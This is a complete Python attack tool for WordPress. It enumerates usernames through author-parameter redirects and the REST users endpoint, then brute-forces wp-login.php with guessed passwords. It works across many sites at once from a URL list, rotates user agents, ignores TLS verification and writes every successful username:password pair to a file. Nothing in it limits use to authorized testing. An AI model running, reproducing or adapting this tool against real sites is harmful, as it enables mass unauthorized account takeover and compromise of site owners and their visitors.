#!/usr/bin/env python3

import requests
import re
import argparse
import concurrent.futures
import urllib3
from urllib.parse import urlparse
import sys
import time
import random
from colorama import Fore, Style, init
import os
from datetime import datetime

#script by Chirag Artani

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

# List of user agents to rotate through
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
]

def parse_args():
    parser = argparse.ArgumentParser(description='WordPress Username Enumeration and Password Brute Force')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
    group.add_argument('-l', '--url-list', help='File containing list of target URLs (one per line)')
    parser.add_argument('-o', '--output', help='Output file for successful logins', default='wp_successful_logins.txt')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers per target (default: 10)')
    parser.add_argument('-s', '--site-workers', type=int, default=5, help='Number of concurrent sites to scan (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--only-enumerate', action='store_true', help='Only enumerate usernames, skip brute force')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    return parser.parse_args()

def normalize_url(url):
    """Normalize URL by ensuring it has a scheme and ends without a trailing slash."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"

def get_random_user_agent():
    """Return a random user agent from the list"""
    return random.choice(USER_AGENTS)

def print_status(message, status='info'):
    """Print status messages with color coding and timestamp"""
    status_colors = {
        'info': Fore.BLUE,
        'success': Fore.GREEN,
        'error': Fore.RED,
        'warning': Fore.YELLOW
    }
    color = status_colors.get(status, Fore.WHITE)
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{timestamp}] {color}[{status.upper()}]{Style.RESET_ALL} {message}")

def enum_from_author_param(url, timeout, delay=0):
    """Enumerate users from /?author=X parameter"""
    users = set()
    
    # Try author parameter for the first few users
    for i in range(1, 5):
        try:
            author_url = f"{url}/?author={i}"
            headers = {'User-Agent': get_random_user_agent()}
            
            response = requests.get(author_url, allow_redirects=False, timeout=timeout, verify=False, headers=headers)
            
            # Check for redirect to author page
            if response.status_code in (301, 302) and 'location' in response.headers:
                location = response.headers['location']
                matches = re.search(r'/author/([^/]+)', location)
                if matches:
                    username = matches.group(1)
                    users.add(username)
                    print_status(f"Found username via redirect: {username} on {url}", "success")
            
            # Add delay if specified
            if delay > 0:
                time.sleep(delay)
                
            # Check for author info in body
            headers = {'User-Agent': get_random_user_agent()}
            body_response = requests.get(author_url, timeout=timeout, verify=False, headers=headers)
            if body_response.status_code == 200:
                for pattern in [r'author-\w+">([a-z0-9_-]+)<', r'/author/([a-z0-9_-]+)/', r'"slug":"([a-z0-9_-]+)"', r'"username":"([a-z0-9_-]+)"']:
                    matches = re.findall(pattern, body_response.text)
                    for username in matches:
                        users.add(username)
                        print_status(f"Found username in body: {username} on {url}", "success")
            
            # Add delay if specified
            if delay > 0:
                time.sleep(delay)
        
        except requests.RequestException as e:
            print_status(f"Error while checking author={i} on {url}: {str(e)}", "error")
    
    return users

def enum_from_rest_api(url, timeout, delay=0):
    """Enumerate users from WP REST API"""
    users = set()
    
    try:
        api_url = f"{url}/wp-json/wp/v2/users"
        headers = {'User-Agent': get_random_user_agent()}
        
        response = requests.get(api_url, timeout=timeout, verify=False, headers=headers)
        
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list):
                    for user in data:
                        if 'slug' in user:
                            username = user['slug']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
                        if 'username' in user:
                            username = user['username']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
            except ValueError:
                pass  # Not valid JSON
    
    except requests.RequestException as e:
        print_status(f"Error while checking REST API on {url}: {str(e)}", "error")
    
    return users

def enumerate_usernames(url, timeout, delay=0):
    """Enumerate WordPress usernames using various methods"""
    print_status(f"Enumerating usernames from {url}")
    
    users = set()
    users.update(enum_from_author_param(url, timeout, delay))
    users.update(enum_from_rest_api(url, timeout, delay))
    
    if not users:
        print_status(f"No usernames found on {url}", "warning")
    else:
        print_status(f"Found {len(users)} unique username(s) on {url}: {', '.join(users)}", "info")
    
    return users

def get_password_list(username):
    """Generate password list for a given username"""
    common_suffixes = ['123', '123456', 'admin123', 'admin12345', 'password123', 'admin888', '12345678']
    common_passwords = ['admin123', 'admin12345', 'password123', 'admin888', '123456', '12345678']
    
    passwords = [username]  # The username itself
    passwords.extend([username + suffix for suffix in common_suffixes])
    passwords.extend(common_passwords)
    
    return passwords

def try_login(url, username, password, timeout, delay=0):
    """Attempt to login to WordPress with given credentials"""
    session = requests.Session()
    login_url = f"{url}/wp-login.php"
    
    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)
        
        if delay > 0:
            time.sleep(delay)
        
        # Prepare login data
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        
        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }
        
        response = session.post(login_url, data=login_data, headers=headers, 
                              allow_redirects=False, timeout=timeout, verify=False)
        
        # Check for successful login (302 redirect with login cookies)
        if response.status_code == 302:
            cookie_header = response.headers.get('Set-Cookie', '')
            if 'wordpress_logged_in' in cookie_header or any(cookie.name.startswith('wordpress_logged_in') for cookie in session.cookies):
                return True
        
        return False
    
    except requests.RequestException:
        return False

def write_success(output_file, url, username, password):
    """Write successful login to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        f.write(f"[{timestamp}] {url} - {username}:{password}\n")

def brute_force_users(url, usernames, timeout, workers, verbose, output_file, delay=0):
    """Brute force WordPress login for the enumerated usernames"""
    if not usernames:
        return []
        
    print_status(f"Starting brute force against {len(usernames)} username(s) on {url} with {workers} workers")
    
    successful_logins = []
    total_attempts = 0
    
    # Create futures for all login attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        
        for username in usernames:
            passwords = get_password_list(username)
            print_status(f"Queuing {len(passwords)} passwords for username '{username}' on {url}")
            
            for password in passwords:
                future = executor.submit(try_login, url, username, password, timeout, delay)
                futures.append((future, username, password))
        
        for future, username, password in futures:
            if username in [login.split(':')[0] for login in successful_logins]:
                # Skip if we already found credentials for this username
                future.cancel()
                continue
                
            total_attempts += 1
            
            try:
                result = future.result()
                if result:
                    credential = f"{username}:{password}"
                    successful_logins.append(credential)
                    print_status(f"✓ SUCCESS: {url} - {credential}", "success")
                    
                    # Write to file immediately
                    write_success(output_file, url, username, password)
                    
                    # Cancel remaining futures for this username
                    for f, u, p in futures:
                        if u == username and not f.done():
                            f.cancel()
                
                elif verbose:
                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
            
            except Exception as e:
                if verbose:
                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
    
    print_status(f"Brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

def process_single_site(url, args):
    """Process a single WordPress site"""
    normalized_url = normalize_url(url)
    
    try:
        usernames = enumerate_usernames(normalized_url, args.timeout, args.delay)
        
        if not usernames:
            print_status(f"No usernames found to brute force on {normalized_url}. Skipping.", "warning")
            return []
        
        if args.only_enumerate:
            print_status(f"Username enumeration completed for {normalized_url}. Skipping brute force as requested.", "info")
            return []
            
        return brute_force_users(normalized_url, usernames, args.timeout, args.workers, args.verbose, args.output, args.delay)
    
    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return []

def process_url_list(url_list_file, args):
    """Process multiple WordPress sites from a URL list file"""
    try:
        with open(url_list_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_status(f"Error reading URL list file: {str(e)}", "error")
        sys.exit(1)
    
    print_status(f"Loaded {len(urls)} URLs from {url_list_file}")
    
    # Create output file with header
    with open(args.output, 'w') as f:
        f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# Format: [Timestamp] URL - username:password\n\n")
    
    # Process URLs in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.site_workers) as executor:
        futures = [executor.submit(process_single_site, url, args) for url in urls]
        
        all_successful_logins = []
        for future in concurrent.futures.as_completed(futures):
            try:
                successful_logins = future.result()
                all_successful_logins.extend(successful_logins)
            except Exception as e:
                print_status(f"Error processing URL: {str(e)}", "error")
    
    # Final summary
    print_status(f"\n{'='*50}")
    print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
    print_status(f"Results saved to {args.output}")
    print_status(f"{'='*50}")

def main():
    args = parse_args()
    
    try:
        # Create output directory if it doesn't exist
        output_dir = os.path.dirname(args.output)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        if args.url_list:
            process_url_list(args.url_list, args)
        else:
            # Single target processing
            normalized_url = normalize_url(args.target)
            
            # Initialize output file
            with open(args.output, 'w') as f:
                f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password\n\n")
            
            successful_logins = process_single_site(args.target, args)
            
            if successful_logins and not args.only_enumerate:
                print_status(f"\n{'='*50}")
                print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
                for login in successful_logins:
                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                print_status(f"Results saved to {args.output}")
                print_status(f"{'='*50}")
    
    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user. Exiting.", "warning")
        sys.exit(1)
    except Exception as e:
        print_status(f"An unexpected error occurred: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    main()
